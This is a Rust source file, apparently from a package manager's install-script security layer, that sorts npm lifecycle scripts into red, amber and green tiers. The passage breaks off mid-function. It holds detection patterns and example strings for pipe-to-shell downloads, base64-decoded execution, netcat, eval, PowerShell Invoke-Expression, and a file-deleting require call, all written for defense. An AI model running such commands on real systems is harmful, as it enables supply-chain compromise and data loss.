//! Layer 1 static-gate classifier.
//!
//! Pure, deterministic classification of lifecycle-script bodies into
//! one of three tiers:
//!
//! - [`StaticTier::Red`] — body matches a hand-curated blocklist of
//!   dangerous patterns (pipe-to-shell, base64-decode-to-execution,
//!   nested package-manager installs, rebuilds, downloads-and-runs and
//!   build approvals, flags or variables that re-enable dependency
//!   scripts, Unicode obfuscation, PowerShell `Invoke-Expression`
//!   style, `rm -rf` on `$HOME`, etc.), including inside `sh -c`
//!   command strings. Blocks unconditionally; never reaches the LLM.
//! - [`StaticTier::Green`] — body is exactly one of a tightly-curated
//!   allowlist of pure local build steps (`node-gyp rebuild`, `tsc`,
//!   `prisma generate`, `husky install`, `electron-rebuild`, and
//!   relative-path `node foo.js` style). No network binary
//!   downloaders (D18).
//! - [`StaticTier::Amber`] — everything else, including compound
//!   commands that mix otherwise-green steps, network binary
//!   downloaders per D18, and novel patterns. Deferred to
//!   layers 2/3/4.
//!
//! The classifier NEVER changes execution semantics. `static_tier` is
//! populated for UX annotation only; auto-execution of greens is gated
//! on the sandbox and tier-aware auto-run layer.
//!
//! Only `Green | Amber | Red` are emitted here; `AmberLlm` is reserved
//! for the LLM triage harness, not static classification.
//!
//! ## Algorithm
//!
//! 1. **Raw-string red prefilter** for markers that can survive or
//!    evade tokenization — Unicode control characters (RTL overrides,
//!    zero-width joiners, BOM) and PowerShell literals
//!    (`Invoke-Expression`, `FromBase64String`, `Add-MpPreference`).
//!    These are checked on the raw UTF-8 string before we ever call
//!    [`shlex::split`].
//! 2. **Normalize shell operators, then tokenize.** `shlex` splits on
//!    whitespace with POSIX quoting but does NOT recognize shell
//!    operators — it leaves `|`, `>`, `>>`, `&&`, `||`, etc. embedded
//!    in tokens when there is no surrounding whitespace (empirically:
//!    `curl url|sh` tokenizes as `["curl", "url|sh"]`). Before
//!    tokenizing we run a quote-aware pass that pads every unquoted
//!    operator with spaces so `shlex::split` can do its normal job.
//!    Parse failure (unmatched quotes, etc.) → Amber — the classifier
//!    fails closed. Empty input → Amber.
//! 3. **Tokenized red checks** — scan the token stream for dangerous
//!    commands (pipe-to-shell, `eval`, `node -e`, nested PM installs,
//!    script-policy overrides, `rm -rf` on dangerous targets, etc.),
//!    recursing into `sh -c` / `cmd /c` bodies. This runs BEFORE the
//!    compound-to-amber fallback so that constructs like `curl … | sh`
//!    correctly end up Red rather than Amber.
//! 4. **Compound detection** — any compound operator token (`&&`,
//!    `||`, `;`, `|`, `>`, `>>`, `<`, `<<`, `&`, subshell parens, or
//!    an embedded `` ` ``/`$(` inside a token) → Amber. Compounds of
//!    otherwise-green commands are deliberately amber: approving one
//!    green + one hidden red in the same body would be a silent
//!    bypass.
//! 5. **Green allowlist** — an exact match against a short, curated
//!    set of single-command token shapes.
//! 6. **Fallback** → Amber. Novel-but-uninteresting scripts land here
//!    by design; the user's explicit `lpm approve-scripts` review is
//!    the gate that moves them forward.

use std::sync::LazyLock;

use regex::Regex;

use crate::triage::StaticTier;

/// Additional manifest context the classifier can consult to widen the
/// green tier for safe-looking delegating scripts.
///
/// The classifier's six-step pipeline is **context-free** by default
/// (the script body is the only input). When a caller supplies a
/// `ManifestContext`, the post-tokenize check `matches_delegating_
/// identity_green` can additionally Green a `node install.js`-shaped
/// body when the package's manifest carries an identity signal that
/// pairs with the delegate.
///
/// Threat model: a malicious package can lie about its `repository`
/// field. The widening relies on the manifest field being honest. The
/// install pipeline counter-balance is that the local file's bytes
/// are still in the store and `lpm approve-scripts` review remains
/// available — the widening just changes the default from "always
/// prompt" to "auto-run when shape + identity agree."
pub struct ManifestContext<'a> {
    /// The package's `name` (with scope if scoped, e.g. `@swc/core`).
    pub package_name: &'a str,
    /// `repository` URL from `package.json`. Accept both shorthand
    /// strings and the full `git+https://…` shape; the classifier
    /// scans for the package's base name as a path segment.
    pub repository: Option<&'a str>,
    /// `bin` entries from `package.json`. Either the object-form's
    /// keys or the single bare-string form normalized to a list. The
    /// classifier treats each bin name as an identity signal — if the
    /// package exposes a binary named after itself, a `node install.js`
    /// fetching that binary aligns with the package's identity.
    pub bin_names: &'a [&'a str],
    /// The package's publish age in seconds (from now). When
    /// `min_release_age_secs > 0` AND this is below the threshold (or
    /// `None`, meaning age unknown), the identity-match widening REFUSES
    /// to fire — the package stays Amber and is subject to the
    /// script-tier review even when the install-level cooldown gate was
    /// bypassed via `--allow-new`.
    ///
    /// This preserves the orthogonality of the two security axes:
    /// `--allow-new` opts out of cooldown only; the script-tier
    /// review still happens for recent publishes. To also bypass
    /// the script-tier prompt the user explicitly chooses
    /// `--policy=allow` (or sets `minimumReleaseAge: 0` to opt out
    /// of cooldown universally, which then sets `min_release_age_secs`
    /// to 0 and disables the defense-in-depth check).
    pub publish_age_secs: Option<u64>,
    /// The configured minimum release age in seconds. Used to compare
    /// against `publish_age_secs`. The widening's cooldown defense-in-depth
    /// fires when this is `> 0`; when `0` the user has globally opted out
    /// of cooldown and the widening fires regardless of publish age.
    pub min_release_age_secs: u64,
}

/// Classify a single lifecycle-script body into a static tier.
///
/// The input is expected to be the **raw value** of one lifecycle
/// phase (`preinstall` / `install` / `postinstall`) exactly as it
/// appears in a package's `package.json`. Callers that need to
/// classify multiple phases should classify each independently and
/// aggregate worst-wins (Red > AmberLlm > Amber > Green) at the call
/// site — the classifier itself is scoped to a single command string.
///
/// Pure and deterministic: same input → same output across runs,
/// machines, and LPM versions (as long as the rule set hasn't been
/// edited).
///
/// Equivalent to [`classify_with_context`] with `ctx = None`. New
/// call sites that have manifest context available should prefer the
/// contextual form — it's a strict widening (no Green ever becomes
/// Amber/Red, no Red ever becomes Green), so passing `Some(ctx)` only
/// improves the green-rate without softening the safety floor.
pub fn classify(script: &str) -> StaticTier {
    classify_with_context(script, None)
}

/// Classification for automatic execution. Recognized local delegates need
/// review even when the command spelling or manifest identity looks safe.
pub fn classify_for_execution(script: &str) -> StaticTier {
    match classify(script) {
        StaticTier::Green if extract_delegate_path(script).is_some() => StaticTier::Amber,
        tier => tier,
    }
}

/// Context-aware classification.
///
/// When `ctx` is `Some`, an additional green arm fires for
/// "delegate-to-local-file" installers (`node install.js` and close
/// variants) whose package identity matches the manifest's `repository`
/// URL or a `bin` entry name. When `ctx` is `None`, behavior is
/// identical to the context-free classifier.
///
/// The widening is **purely additive** — it can only convert an
/// otherwise-Amber tier into Green when identity matches. The
/// pre-existing Red checks and Green allowlist run unchanged, so
/// passing context never softens the floor.
pub fn classify_with_context(script: &str, ctx: Option<&ManifestContext<'_>>) -> StaticTier {
    if script.len() > MAX_SCRIPT_BYTES {
        return StaticTier::Red;
    }
    // Empty / whitespace-only bodies don't run anything; treat as
    // Amber (the caller probably should have short-circuited already,
    // but fail conservative rather than silently green).
    if script.trim().is_empty() {
        return StaticTier::Amber;
    }

    // Step 1 — raw-string red prefilter.
    if contains_unicode_control_chars(script) || contains_powershell_red_literal(script) {
        return StaticTier::Red;
    }

    // Step 2 — normalize shell operators + tokenize. `shlex` only
    // splits on whitespace (with POSIX quoting); it does NOT
    // recognize shell operators. Empirically, `curl url|sh`
    // tokenizes as `["curl", "url|sh"]` (the `|` stays embedded),
    // which would silently downclass `curl … | sh` to Amber via the
    // compound-detection fallback. To fix, pad unquoted operators
    // with whitespace BEFORE handing the string to shlex. Parse
    // failure (unmatched quotes, etc.) → Amber, so malformed scripts
    // can't slip into Green.
    let normalized = normalize_operators(script);
    let tokens: Vec<String> = match shlex::split(&normalized) {
        Some(t) if !t.is_empty() => t,
        _ => return StaticTier::Amber,
    };

    // Step 3 — tokenized red checks. MUST run before the compound
    // fallback so `curl … | sh` doesn't degrade to Amber.
    if normalized_is_red(&normalized, &tokens, 0) {
        return StaticTier::Red;
    }

    // Step 4 — compound fallback.
    if tokens_are_compound(&tokens) {
        return StaticTier::Amber;
    }

    // Step 5 — green allowlist.
    if tokens_match_green(&tokens, script) {
        return StaticTier::Green;
    }

    // Step 5b — delegate-to-local-file installer with a matching
    // identity signal. Only fires when the caller supplied manifest
    // context; without it the classifier falls through to Amber.
    if let Some(ctx) = ctx
        && matches_delegating_identity_green(script, ctx)
    {
        return StaticTier::Green;
    }

    // Step 6 — default.
    StaticTier::Amber
}

// ─────────────────────────────────────────────────────────────────────
// Step 1 — raw-string prefilter
// ─────────────────────────────────────────────────────────────────────

/// Check for Unicode code points that enable bidi / direction
/// obfuscation inside otherwise-innocuous-looking script text. These
/// are never legitimately needed in a postinstall script body; a
/// maintainer who ships one is either mistaken or malicious, and
/// either way the script needs human review.
///
/// Covers:
/// - `U+200B..U+200F` — zero-width space / non-joiner / joiner +
///   left-to-right mark / right-to-left mark.
/// - `U+202A..U+202E` — bidirectional embedding / override controls
///   (the "Trojan Source" attack class).
/// - `U+2066..U+2069` — LRI / RLI / FSI / PDI isolates.
/// - `U+FEFF` — zero-width no-break space / BOM.
fn contains_unicode_control_chars(s: &str) -> bool {
    s.chars().any(|c| {
        let cp = c as u32;
        (0x200B..=0x200F).contains(&cp)
            || (0x202A..=0x202E).contains(&cp)
            || (0x2066..=0x2069).contains(&cp)
            || cp == 0xFEFF
    })
}

/// Check the raw (case-insensitive) script for PowerShell constructs
/// that are the common malware shape: `Invoke-Expression` (aliased as
/// `iex`), `FromBase64String`, `Add-MpPreference`. These survive
/// tokenization intact but a substring check is cheaper and equally
/// specific.
///
/// The bare `iex` token (PowerShell alias for `Invoke-Expression`) is
/// intentionally handled in [`tokens_match_red`] instead — checking
/// `iex` as a substring would false-positive on English words like
/// "complex" and "regex".
fn contains_powershell_red_literal(s: &str) -> bool {
    const LITERALS_LC: &[&str] = &["invoke-expression", "frombase64string", "add-mppreference"];
    let lower = s.to_ascii_lowercase();
    LITERALS_LC.iter().any(|lit| lower.contains(lit))
}

// ─────────────────────────────────────────────────────────────────────
// Step 2 — operator normalization (quote-aware)
// ─────────────────────────────────────────────────────────────────────

/// Pad every UNQUOTED shell operator with surrounding whitespace so
/// the downstream [`shlex::split`] produces standalone operator
/// tokens.
///
/// `shlex` handles POSIX word-splitting + quoting but does NOT
/// recognize shell operators. Without this pre-pass, `curl url|sh`
/// tokenizes as `["curl", "url|sh"]` (the `|` stays glued to the URL)
/// and the tokenized red check for pipe-to-shell never fires — the
/// script silently downclasses to Amber via the generic compound
/// fallback, violating the "red wins over compound" contract.
///
/// The walker tracks single-quote / double-quote / backslash escape
/// state so we don't touch operator characters that appear inside a
/// quoted string (those are literal content, not operators).
///
/// Recognized two-char operators (parsed as a unit so `>>` doesn't
/// become `> >`): `&&`, `||`, `>>`, `<<`.
///
/// Recognized single-char operators: `|`, `&`, `;`, `<`, `>`, `(`,
/// `)`.
///
/// Everything else (including `{`, `}`, brace-expansion, and process
/// substitution `<(…)`) is left untouched; this is a deliberately
/// conservative list focused on the operators that gate the red
/// patterns matched by the classifier.
pub(crate) fn normalize_operators(s: &str) -> String {
    let mut out = String::with_capacity(s.len() * 2);
    let mut chars = s.chars().peekable();
    let mut in_single_quote = false;
    let mut in_double_quote = false;

    while let Some(c) = chars.next() {
        // Backslash escapes the next char ONLY outside single quotes
        // (POSIX: inside `'…'`, backslash is literal).
        if c == '\\' && !in_single_quote {
            out.push(c);
            if let Some(next) = chars.next() {
                out.push(next);
            }
            continue;
        }

        if c == '\'' && !in_double_quote {
            in_single_quote = !in_single_quote;
            out.push(c);
            continue;
        }
        if c == '"' && !in_single_quote {
            in_double_quote = !in_double_quote;
            out.push(c);
            continue;
        }

        if in_single_quote || in_double_quote {
            out.push(c);
            continue;
        }

        // Unquoted region — look for operators to pad.
        match c {
            '|' | '&' | '<' | '>' => {
                let two_char = matches!(
                    (c, chars.peek().copied()),
                    ('|', Some('|')) | ('&', Some('&')) | ('<', Some('<')) | ('>', Some('>'))
                );
                out.push(' ');
                out.push(c);
                if two_char {
                    out.push(chars.next().expect("peeked"));
                }
                out.push(' ');
            }
            ';' | '(' | ')' => {
                out.push(' ');
                out.push(c);
                out.push(' ');
            }
            _ => out.push(c),
        }
    }

    out
}

/// A lifecycle script longer than this is red without being read. Real
/// lifecycle scripts are a few hundred bytes; one this long can't be
/// reviewed, and each command string nested in it is read again at
/// every nesting level.
const MAX_SCRIPT_BYTES: usize = 64 * 1024;

/// The words of a tokenized script, and where each simple command ends.
///
/// A red check reads a command word and the arguments after it, up to
/// the next compound operator. Any word may be the command, so wrappers
/// such as `corepack pnpm install` can't hide one. A check that rereads
/// the arguments for every word would be quadratic in a script that
/// repeats a command word, so the checks read per-position tables built
/// in one right-to-left pass instead.
struct Words<'a> {
    words: Vec<&'a str>,
    /// Each word's [`command_name`].
    names: Vec<String>,
    /// Whether each word is a compound operator ([`is_compound_op`]).
    operators: Vec<bool>,
}

impl<'a> Words<'a> {
    fn new(tokens: &'a [String]) -> Self {
        Self {
            words: tokens.iter().map(String::as_str).collect(),
            names: tokens.iter().map(|token| command_name(token)).collect(),
            operators: tokens.iter().map(|token| is_compound_op(token)).collect(),
        }
    }

    fn len(&self) -> usize {
        self.words.len()
    }

    /// Whether position `index` holds an argument of the command before
    /// it: a word that isn't a compound operator.
    fn is_argument(&self, index: usize) -> bool {
        index < self.words.len() && !self.operators[index]
    }

    /// For each position, the first position at or after it, within the
    /// same simple command, whose word `matches`. Two entries past the
    /// end keep lookups of `index + 2` in bounds.
    fn next_matching(&self, matches: impl Fn(&str) -> bool) -> Vec<Option<usize>> {
        let mut next = vec![None; self.len() + 2];
        let mut found = None;
        for index in (0..self.len()).rev() {
            if self.operators[index] {
                found = None;
            } else if matches(self.words[index]) {
                found = Some(index);
            }
            next[index] = found;
        }
        next
    }

    /// True when the word at `index` is where a shell would look for a
    /// command name rather than an argument to an earlier command.
    fn is_command_position(&self, index: usize) -> bool {
        let Some(previous) = index.checked_sub(1) else {
            return true;
        };
        self.operators[previous]
            || is_environment_assignment(self.words[previous])
            || matches!(
                self.names[previous].as_str(),
                "env"
                    | "exec"
                    | "command"
                    | "corepack"
                    | "sudo"
                    | "time"
                    | "nice"
                    | "nohup"
                    | "xargs"
                    | "npx"
                    | "bunx"
                    | "pnpx"
                    | "dlx"
                    | "x"
            )
    }
}

/// The positional arguments of a command whose arguments start at a
/// given position: everything up to `--` that isn't a flag or a flag's
/// value.
struct Positionals {
    /// The first positional at or after each position.
    first: Vec<Option<usize>>,
}

impl Positionals {
    fn new(words: &Words<'_>, unknown: UnknownFlags) -> Self {
        let mut first = vec![None; words.len() + 2];
        for index in (0..words.len()).rev() {
            if !words.is_argument(index) {
                continue;
            }
            let word = words.words[index];
            first[index] = if word == "--" {
                None
            } else if word.starts_with('-') {
                let takes_value = VALUE_FLAGS.contains(&word)
                    || (unknown == UnknownFlags::TakeAValue && !word.contains('='));
                if !takes_value {
                    first[index + 1]
                } else if words.is_argument(index + 1) {
                    first[index + 2]
                } else {
                    None
                }
            } else {
                Some(index)
            };
        }
        Self { first }
    }

    /// The first positional of the arguments starting at `start`.
    fn first(&self, start: usize) -> Option<usize> {
        self.first.get(start).copied().flatten()
    }

    /// The positional after the one at `positional`.
    fn after(&self, positional: usize) -> Option<usize> {
        self.first(positional + 1)
    }

    /// For each positional, whether it or a later positional of the same
    /// command satisfies `matches`.
    fn any_from(&self, words: &Words<'_>, matches: impl Fn(&str) -> bool) -> Vec<bool> {
        let mut any = vec![false; words.len() + 1];
        for index in (0..words.len()).rev() {
            any[index] =
                matches(words.words[index]) || self.after(index).is_some_and(|next| any[next]);
        }
        any
    }
}

// ─────────────────────────────────────────────────────────────────────
// Step 3 — tokenized red checks
// ─────────────────────────────────────────────────────────────────────

fn words_match_red_at(words: &Words<'_>, shell_depth: usize) -> bool {
    if any_token_is_red_command(words) {
        return true;
    }
    if has_node_eval(words) {
        return true;
    }
    if has_pipe_to_shell(words) {
        return true;
    }
    if has_nested_package_manager(words) {
        return true;
    }
    if has_script_policy_override(words) {
        return true;
    }
    if has_red_shell_command_string(words, shell_depth) {
        return true;
    }
    if has_dangerous_rm(words) {
        return true;
    }
    if has_dangerous_chmod(words) {
        return true;
    }
    if has_dangerous_redirect(words) {
        return true;
    }
    false
}

/// Standalone commands that are always red no matter what comes after
/// them. Case-insensitive because `iex` is a PowerShell alias and
/// pwsh is case-insensitive; the others are checked against their
/// canonical lowercase spellings out of an abundance of caution.
fn any_token_is_red_command(words: &Words<'_>) -> bool {
    words.words.iter().any(|t| {
        let lc = t.to_ascii_lowercase();
        matches!(lc.as_str(), "iex" | "nc" | "netcat" | "ncat" | "eval")
    })
}

/// `node -e '…'` / `node --eval '…'` — a small-surface RCE primitive
/// indistinguishable from malware when it shows up in a postinstall.
/// Requires the `-e` / `--eval` flag to be **adjacent** to `node` so
/// `node --other-flag -e` still trips (defensive against argument
/// reordering) but we don't false-positive on a random `-e` floating
/// elsewhere in the token stream.
///
/// **Softfail-wrapper exception**: the
/// canonical `node -e "try{require('./X')}catch(e){}"` and
/// `node -e "import('./X').catch(...)"` shape is shipped by core-js,
/// msw, nx, vue-demi, and es5-ext, among others. The body is a fixed
/// static string containing a single local relative require/import
/// with a swallowed error — fully equivalent in risk to `node ./X`
/// and explicitly not arbitrary-code-execution. When the body matches
/// that exact shape and the path is safe-relative, we skip the red
/// classification here so the script can land Green (via
/// [`matches_node_eval_softfail_green`]) or Amber via the fallback,
/// per the default-amber-unless-explicit-extension rule.
fn has_node_eval(words: &Words<'_>) -> bool {
    // Each scan stops at the first word that isn't a flag, and `node`
    // isn't one, so scans from different `node` words never overlap.
    for (i, t) in words.words.iter().enumerate() {
        if *t != "node" {
            continue;
        }
        for (j, follower) in words.words.iter().enumerate().skip(i + 1) {
            if words.operators[j] {
                break;
            }
            if *follower == "-e" || *follower == "--eval" {
                // The next token (after this flag) is the eval body.
                // If it's a safe softfail wrapper, don't red on this
                // `-e`; keep scanning (the outer for-loop covers the
                // unlikely "two node -e's in one script" case).
                if let Some(body) = words.words.get(j + 1)
                    && parse_softfail_wrapper(body).is_some()
                {
                    break;
                }
                return true;
            }
            if let Some(body) = follower.strip_prefix("--eval=") {
                if parse_softfail_wrapper(body).is_some() {
                    break;
                }
                return true;
            }
            if let Some(body) = follower.strip_prefix("-e=") {
                if parse_softfail_wrapper(body).is_some() {
                    break;
                }
                return true;
            }
            if let Some(body) = follower.strip_prefix("-e")
                && !body.is_empty()
            {
                if parse_softfail_wrapper(body).is_some() {
                    break;
                }
                return true;
            }
            // Keep scanning past other flags (e.g. `node --no-warnings -e`).
            if !follower.starts_with('-') {
                break;
            }
        }
    }
    false
}

/// The two canonical "soft-fail postinstall wrapper" shapes we accept.
///
/// Both have the same safety property: a single static require/import
/// of a relative local path with a swallowed error handler. The handler
/// body is constrained to trivial expressions (empty / `void 0` /
/// `undefined` / `null`) so we don't accept catchers that re-run
/// arbitrary code on error.
///
/// Capture group 1 is the relative path (everything inside the
/// require/import quotes).
static SOFTFAIL_TRY_REQUIRE: LazyLock<Regex> = LazyLock::new(|| {
    // try { require('./X') } catch (e) {}
    // Whitespace tolerated everywhere; semicolons optional; quotes
    // either flavour; catch handler signature unconstrained because the
    // catch BODY is required to be empty `{}`.
    Regex::new(
        r#"(?x)
        ^\s*
        try\s*\{\s*
            require\(\s*['"]([^'"]+)['"]\s*\)\s*;?\s*
        \}\s*
        catch\s*\([^)]*\)\s*\{\s*\}\s*;?
        \s*$
        "#,
    )
    .expect("SOFTFAIL_TRY_REQUIRE regex is well-formed")
});

static SOFTFAIL_IMPORT_CATCH: LazyLock<Regex> = LazyLock::new(|| {
    // import('./X').catch(() => void 0)
    // Trivial-handler-only: arrow with zero/one params, returning
    // `void 0`, `undefined`, `null`, or an empty `{}` body.
    Regex::new(
        r#"(?x)
        ^\s*
        import\(\s*['"]([^'"]+)['"]\s*\)
        \s*\.\s*catch\(\s*
            (?:
                \([^)]*\)            # `()` or `(e)` or `(_)`
                |[_a-zA-Z][\w_]*     # bare `e`
            )
            \s*=>\s*
            (?:
                void\s+0
                |undefined
                |null
                |\{\s*\}
            )
        \s*\)\s*;?
        \s*$
        "#,
    )
    .expect("SOFTFAIL_IMPORT_CATCH regex is well-formed")
});

/// Recognise the safe soft-fail postinstall wrapper shape. Returns the
/// inner relative path if `body` matches one of the two accepted
/// shapes, else `None`.
///
/// Examples that match (and capture the path):
/// - `try{require('./postinstall')}catch(e){}` → `./postinstall`
/// - `import('./scripts/postinstall.js').catch(() => void 0)` → `./scripts/postinstall.js`
///
/// Examples that do NOT match:
/// - `require('fs').unlinkSync('/etc/passwd')` — no try/catch wrap
/// - `try{require('./x')}catch(e){doEvil()}` — non-empty catch body
/// - `try{require('./a');require('./b')}catch(e){}` — multiple statements
fn parse_softfail_wrapper(body: &str) -> Option<String> {
    if let Some(caps) = SOFTFAIL_TRY_REQUIRE.captures(body) {
        return Some(caps.get(1)?.as_str().to_string());
    }
    if let Some(caps) = SOFTFAIL_IMPORT_CATCH.captures(body) {
        return Some(caps.get(1)?.as_str().to_string());
    }
    None
}

/// `curl … | sh` / `wget … | bash` / `base64 -d … | sh`. We look for a
/// `|` pipe operator whose RHS is a shell, and whose LHS contains
/// either a fetcher (`curl` / `wget` / `fetch`) or a `base64 -d` /
/// `base64 --decode`.
fn has_pipe_to_shell(words: &Words<'_>) -> bool {
    const SHELLS: &[&str] = &["sh", "bash", "zsh", "dash", "ksh", "csh", "tcsh", "fish"];

    let mut prior_fetches = false;
    let mut prior_decodes = false;
    for (i, t) in words.words.iter().enumerate() {
        if *t == "|"
            && (prior_fetches || prior_decodes)
            && words
                .words
                .get(i + 1)
                .is_some_and(|next| SHELLS.contains(next))
        {
            return true;
        }
        prior_fetches |= matches!(*t, "curl" | "wget" | "fetch");
        prior_decodes |= matches!(*t, "-d" | "--decode") && i > 0 && words.words[i - 1] == "base64";
    }
    false
}

/// Nested package-manager work: the postinstall of package A installing
/// B, rebuilding the tree, fetching and running a package, or approving
/// other packages' builds. Always red — the outer install has already
/// resolved + audited its dependency graph; a postinstall that reaches
/// for another PM is actively trying to run un-audited code, and any
/// approval it passes along was never shown to the user.
///
/// The subcommand is the first positional argument after global flags
/// (and the values of flags that take one), so `npm --prefix x install`
/// and `pnpm -C dir add` are caught while `npm run install` is not.
/// Any token can be the command, so wrappers (`corepack pnpm install`)
/// do not hide it either.
fn has_nested_package_manager(words: &Words<'_>) -> bool {
    let managers: Vec<(usize, NestedManager)> = words
        .names
        .iter()
        .enumerate()
        .filter_map(|(index, name)| NestedManager::for_command(name).map(|m| (index, m)))
        .collect();
    if managers.is_empty() {
        return false;
    }
    let arguments = ManagerArguments::new(words);
    managers.into_iter().any(|(index, manager)| {
        manager.reaches_other_packages(&arguments, index + 1, words.is_command_position(index))
    })
}

/// What [`NestedManager::reaches_other_packages`] reads from the
/// arguments that start at each position.
struct ManagerArguments<'w, 'a> {
    words: &'w Words<'a>,
    /// Indexed by [`UnknownFlags`].
    positionals: [Positionals; 2],
    yarn_install_verb_from: [Vec<bool>; 2],
    remote_module_from: [Vec<bool>; 2],
    next_download_request: Vec<Option<usize>>,
    next_double_dash: Vec<Option<usize>>,
    next_query_flag: Vec<Option<usize>>,
    positions: std::collections::HashMap<&'a str, Vec<usize>>,
}

impl<'w, 'a> ManagerArguments<'w, 'a> {
    fn new(words: &'w Words<'a>) -> Self {
        let positionals = [
            Positionals::new(words, UnknownFlags::TakeNoValue),
            Positionals::new(words, UnknownFlags::TakeAValue),
        ];
        let yarn_install_verb = |word: &str| YARN_INSTALL_VERBS.contains(&word);
        let yarn_install_verb_from = [
            positionals[0].any_from(words, yarn_install_verb),
            positionals[1].any_from(words, yarn_install_verb),
        ];
        let remote_module_from = [
            positionals[0].any_from(words, is_remote_module_specifier),
            positionals[1].any_from(words, is_remote_module_specifier),
        ];
        let mut positions: std::collections::HashMap<&str, Vec<usize>> =
            std::collections::HashMap::new();
        for (index, word) in words.words.iter().enumerate() {
            positions.entry(word).or_default().push(index);
        }
        Self {
            words,
            positionals,
            yarn_install_verb_from,
            remote_module_from,
            next_download_request: words.next_matching(is_download_request),
            next_double_dash: words.next_matching(|word| word == "--"),
            next_query_flag: words.next_matching(is_query_flag),
            positions,
        }
    }

    /// The first position at or after `start` holding `word`.
    fn position_of(&self, word: &str, start: usize) -> Option<usize> {
        let positions = self.positions.get(word)?;
        positions
            .get(positions.partition_point(|&position| position < start))
            .copied()
    }

    /// [`runner_fetches_explicitly`] for the arguments starting at `start`.
    fn runner_fetches_explicitly(&self, start: usize) -> bool {
        let double_dash = self.next_double_dash.get(start).copied().flatten();
        let requests_download = self
            .next_download_request
            .get(start)
            .copied()
            .flatten()
            .is_some_and(|request| double_dash.is_none_or(|double_dash| request < double_dash));
        let spec = self.positionals[UnknownFlags::TakeNoValue as usize]
            .first(start)
            .or_else(|| {
                double_dash
                    .map(|double_dash| double_dash + 1)
                    .filter(|&index| self.words.is_argument(index))
            })
            .map(|index| self.words.words[index]);
        requests_download || spec.is_some_and(is_explicit_package_spec)
    }
}

/// Global flags across npm / pnpm / yarn / bun / deno / lpm whose value
/// is the next token unless written as `--flag=value`.
const VALUE_FLAGS: &[&str] = &[
    "--prefix",
    "-C",
    "--dir",
    "--cwd",
    "--filter",
    "-F",
    "--workspace",
    "-w",
    "--workspace-dir",
    "--userconfig",
    "--globalconfig",
    "--cache",
    "--cache-dir",
    "--cache-folder",
    "--store-dir",
    "--modules-folder",
    "--registry",
    "--loglevel",
    "--location",
    "--reporter",
    "--config",
    "-c",
    "--import-map",
    "--lock",
];

/// How [`positional_args`] reads a flag it doesn't know.
#[derive(Clone, Copy, PartialEq, Eq)]
enum UnknownFlags {
    /// As a boolean switch.
    TakeNoValue,
    /// As taking the next token as its value (`npm --omit dev install`).
    TakeAValue,
}

/// Lowercased basename of a command token without a Windows launcher
/// extension, so `/usr/local/bin/npm` and `node_modules\.bin\npm.cmd`
/// both read as `npm`.
fn command_name(token: &str) -> String {
    let base = token.rsplit(['/', '\\']).next().unwrap_or(token);
    let mut name = base.to_ascii_lowercase();
    for extension in [".cmd", ".exe", ".bat", ".ps1"] {
        if name.ends_with(extension) {
            name.truncate(name.len() - extension.len());
            break;
        }
    }
    name
}

pub(crate) fn is_environment_assignment(token: &str) -> bool {
    token.split_once('=').is_some_and(|(name, _)| {
        !name.is_empty()
            && !name.starts_with(|c: char| c.is_ascii_digit())
            && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
    })
}

enum NestedManager {
    /// Always downloads and executes a package (`pnpx`).
    Runner,
    /// Runs a local binary when one is installed and downloads the
    /// package otherwise (`npx`, `bunx`); see [`runner_fetches_explicitly`].
    LocalFirstRunner,
    Npm,
    Pnpm,
    /// A bare `yarn` (flags only) also runs an install.
    Yarn,
    Bun,
    /// `deno run npm:x` / `deno https://…` also executes code that was
    /// never part of the audited graph.
    Deno,
    Lpm,
    /// pip / gem / cargo / brew.
    SystemInstaller,
}

/// npm accepts every alias and typo-alias listed in its command table;
/// covering only the canonical names would leave `npm isntall` open.
const NPM_INSTALL_VERBS: &[&str] = &[
    "install",
    "i",
    "in",
    "ins",
    "inst",
    "insta",
    "instal",
    "isnt",
    "isnta",
    "isntal",
    "isntall",
    "add",
    "ci",
    "clean-install",
    "ic",
    "install-clean",
    "isntall-clean",
    "install-test",
    "it",
    "install-ci-test",
    "cit",
    "clean-install-test",
    "sit",
    "update",
    "up",
    "upgrade",
    "udpate",
    "rebuild",
    "rb",
    "link",
    "ln",
    "dedupe",
    "ddp",
    "approve-scripts",
    "install-scripts",
];

const PNPM_INSTALL_VERBS: &[&str] = &[
    "install",
    "i",
    "add",
    "update",
    "up",
    "upgrade",
    "rebuild",
    "rb",
    "dlx",
    "link",
    "ln",
    "import",
    "install-test",
    "it",
    "dedupe",
    "approve-builds",
];

const YARN_INSTALL_VERBS: &[&str] = &[
    "install", "add", "up", "upgrade", "dlx", "rebuild", "link", "import", "global",
];

const BUN_INSTALL_VERBS: &[&str] = &["install", "i", "add", "a", "update", "link", "ci"];

const DENO_INSTALL_VERBS: &[&str] = &["install", "i", "add", "cache", "ci", "approve-scripts"];

const LPM_INSTALL_VERBS: &[&str] = &[
    "install",
    "i",
    "add",
    "ci",
    "dlx",
    "create",
    "rebuild",
    "upgrade",
    "update",
    "approve-scripts",
];

/// `<pm> create <x>` / `npm init <x>` download and run `create-<x>`.
/// `npm init` with no initializer only writes a manifest.
const INITIALIZER_VERBS: &[&str] = &["create", "init", "innit"];

impl NestedManager {
    fn for_command(command: &str) -> Option<Self> {
        Some(match command {
            "pnpx" => Self::Runner,
            "npx" | "npx-cli.js" | "bunx" => Self::LocalFirstRunner,
            "npm" | "npm-cli.js" => Self::Npm,
            "pnpm" | "pnpm.cjs" | "pnpm.mjs" => Self::Pnpm,
            "yarn" | "yarnpkg" | "yarn.js" | "yarn.cjs" => Self::Yarn,
            "bun" => Self::Bun,
            "deno" => Self::Deno,
            "lpm" => Self::Lpm,
            "pip" | "pip3" | "gem" | "cargo" | "brew" => Self::SystemInstaller,
            _ => return None,
        })
    }

    /// The command's arguments are every word from `start` up to the
    /// next compound operator. A flag LPM doesn't know may or may not
    /// take a value, so both readings are checked.
    fn reaches_other_packages(
        &self,
        arguments: &ManagerArguments<'_, '_>,
        start: usize,
        at_command_position: bool,
    ) -> bool {
        self.reaches_with(
            arguments,
            start,
            UnknownFlags::TakeNoValue,
            at_command_position,
        ) || self.reaches_with(arguments, start, UnknownFlags::TakeAValue, false)
    }

    fn reaches_with(
        &self,
        arguments: &ManagerArguments<'_, '_>,
        start: usize,
        unknown: UnknownFlags,
        at_command_position: bool,
    ) -> bool {
        let words = &arguments.words.words;
        let positionals = &arguments.positionals[unknown as usize];
        let first = positionals.first(start);
        let second = first.and_then(|first| positionals.after(first));
        let subcommand = first.map(|first| words[first]);
        let subcommand_in = |verbs: &[&str]| subcommand.is_some_and(|s| verbs.contains(&s));
